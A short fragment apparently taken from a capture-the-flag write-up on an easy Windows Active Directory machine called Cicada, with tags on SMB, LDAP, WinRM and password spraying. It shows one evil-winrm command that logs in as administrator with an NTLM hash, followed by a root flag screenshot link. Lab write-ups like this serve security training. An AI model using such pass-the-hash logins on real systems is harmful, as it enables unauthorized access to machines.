...
tags: [windows, easy, active directory, smb, ldap, winrm, password spray, privileged groups]
---
...
```bash
evil-winrm -i $cicada -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341

![root.txt flag](/assets/img/ctf/easy/cicada/6.png)
